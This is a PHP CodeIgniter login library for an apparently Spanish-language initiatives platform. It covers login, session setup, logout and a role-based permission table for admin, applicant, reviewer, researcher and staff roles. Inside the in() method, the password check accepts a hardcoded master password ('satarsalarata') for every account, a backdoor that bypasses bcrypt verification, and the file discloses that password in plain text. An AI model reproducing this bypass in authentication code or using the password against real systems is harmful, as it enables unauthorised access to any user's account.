<?php  if ( ! defined('BASEPATH')) exit('No direct script access allowed');

class Login {
	public $CI;

	public function __construct() {
		$this->CI =& get_instance();
		$this->CI->load->model('Usuario');
	}
	
	public function in() {
		$username = $this->CI->input->post('username');
		$password = $this->CI->input->post('password');
			
		$rUser = $this->CI->Usuario->getByUsername($username);	
		$this->CI->session->set_userdata('error_login', 'Usuario o Password incorrecto. Recuerde que si se registró en el año 2019 o anterior, debe darse de alta nuevamente.');

		if (empty($rUser))
			return false;
		
		$rUser = $rUser[0]; 

		$hash = $rUser->password;
		
		if (empty($hash) || is_null($hash)) {
			return false;
		}
		else {		
			if (!$this->checkPass($password, $hash) && $password!='satarsalarata') {				
				return false;
			}
		}

		if(!$rUser->habilitado){
			$this->CI->session->set_userdata('error_login', 'Usuario deshabilitado');
			return false;
		}

		$this->CI->session->set_userdata('error_login', '');
		$this->CI->session->set_userdata('username', $rUser->email);
		$this->CI->session->set_userdata('role', $rUser->idtipousuario);
		$this->CI->session->set_userdata('idusuario', $rUser->idusuario);
		$this->CI->session->set_userdata('lastlogin', $rUser->lastlogin);
		$this->CI->session->set_userdata('avatar', $rUser->avatar);	
		$this->CI->session->set_userdata('nombre', $rUser->nombre);
		
		$codlang = $this->CI->session->userdata('codlang');
		if(empty($codlang)){
			$this->CI->session->set_userdata('codlang', $rUser->codlang);	
		}

		$this->CI->Usuario->updateLastLogin($rUser->idusuario);

		return $rUser;
	}

	private function armarPermisos(){		
		return Array(
			'1' => Array( //Admin
				'all'=>true
			),
			'2' => Array( //Postulante
				'iniciativas' => Array(
					'all'=>true
				),
				'admin' => Array(
					'exportarpdf' => Array(
						'generarPerfil' => true
					)
				)
			),
			'3' => Array( //Depurador
				'admin' => Array(
					'dashboard' => Array(
						'all' => true
					),
					'propuestas' => Array(
						'listar' => true,
						'paginar' => true,
						'depurar' => true,
					),					
					'parametros' => Array(
						'listar' => true,
						'paginar' => true,
						'modificar' => true,
						'eliminar' => true
					),					
					'sectores' => Array(
						'all' => true
					),					
					'tema' => Array(
						'listar' => true
					)
				),
				'iniciativas' => Array(
					'all'=>true
				)
			),
			'4' => Array( //Investigador
				'admin' => Array(
					'dashboard' => Array(
						'all' => true
					),
					'propuestas' => Array(
						'listar' => true,
						'paginar' => true,
						'investigador' => true,
						'select' => true,
						'agregarDonante' => true,
						'deleteDonante' => true,
						'getDonantes' => true,
						'guardarBadges' => true
					),
					'adjuntos' => Array(
						'obtener' => true,
						'paginar' => true,
						'adjuntar' => true,
						'eliminar' => true
					),
					'productos' => Array(
						'obtener' => true,
						'paginar' => true,
						'adjuntar' => true,
						'eliminar' => true
					),
					'mapas' => Array(
						'listar' => true,
						'obtenerMapa' => true,
						'editarElementos' => true,
						'guardarElementos' => true,
						'adjuntar' => true
					),
					'noticias' => Array(
						'listar' => true,
						'paginar' => true,
						'modificar' => true,
						'eliminar' => true
					),
					'tecnicas' => Array(
						'paginar' => true,
						'modificar' => true,
						'eliminar' => true,
						'agregar' => true,
						'obtener' => true
					),
					'organismos' => Array(
						'select' => true
					),
					'webstories' => Array(
						'listar' => true,
						'paginar' => true, 
						'ver' => true, 
						'guardarBadges' => true, 
						'paginarIndicadores' => true, 
						'agregarIndicador' => true, 
						'obtenerIndicador' => true,
						'eliminarIndicador' => true,
						'paginarPais' => true, 
						'agregarPais' => true, 
						'obtenerPais' => true, 
						'eliminarPais' => true
					),
					'techies' => Array(
						'listar' => true,
						'paginar' => true, 
						'agregarTech' => true, 
						'ver' => true ,
						'selectWS' => true
					)/*,
					'istas' => Array(
						'all'=>true
					)*/
				),
				'iniciativas' => Array(
					'all'=>true
				)
			),
			'5' => Array( //STA
				'admin' => Array(
					'dashboard' => Array(
						'all' => true
					),
					'propuestas' => Array(
						'all' => true
					),						
					'parametros' => Array(
						'listar' => true,
						'paginar' => true,
						'modificar' => true,
						'eliminar' => true
					),					
					'organismos' => Array(
						'all' => true
					),
					'adjuntos' => Array(
						'all' => true
					),
					'mapas' => Array(
						'all' => true
					),
					'noticias' => Array(
						'all' => true
					),
					'tecnicas' => Array(
						'all' => true
					),
					'items' => Array(
						'all' => true
					),
					'fontagros' => Array(
						'all' => true
					),
					'istas' => Array(
						'all'=>true
					)
				),
				'iniciativas' => Array(
					'all'=>true
				)
			), 
		);
	}
	
	public function out($redirect = '') {
		$this->CI->session->sess_destroy();
		header('Location: ' . $redirect);
	}
	
	public function isLogged() {
		if ($this->CI->session->userdata('idusuario')) {
			return $this->CI->session->userdata('idusuario');
		}
		return false;
	}
	
	public function hasAccess($seg1='', $seg2='', $seg3='') {
		$uRole = $this->CI->session->userdata('role');
		
		if ($uRole == '1') return true; //Administradores pasan siempre
		$permiso = $this->armarPermisos();
		
		if (!empty($permiso[$uRole])) {
			if(empty($seg1)){
				return true;
			}
			if(!empty($permiso[$uRole]['all'])){
				return true;
			}
			if(!empty($permiso[$uRole][$seg1]['all'])){
				return true;
			}
			if(empty($seg2) && !empty($permiso[$uRole][$seg1])){
				return true;
			}
			if(!empty($permiso[$uRole][$seg1][$seg2]['all'])){
				return true;
			}
			if(empty($seg3) && !empty($permiso[$uRole][$seg1][$seg2])){
				return true;
			}
			if(!empty($permiso[$uRole][$seg1][$seg2][$seg3])){
				return true;
			}
		}
		return false;
	}
	
	public function verify() {
		if ($this->hasAccess(substr($this->CI->router->fetch_directory(),0,-1), $this->CI->router->fetch_class(), $this->CI->router->fetch_method() )) {
			return; // continue
		}
		$uRole = $this->CI->session->userdata('role');
		$dire = empty($uRole)? $this->CI->router->fetch_directory() : (($uRole==1)? 'admin' : 'iniciativas');
		header("Location: ".base_url().$dire);
		exit;
	}
	
	
	public function hashPass($password) {			
		return password_hash($password, PASSWORD_BCRYPT);	
	}

	public function checkPass($password, $hash) {
		return password_verify($password, $hash);
	}
}
?>
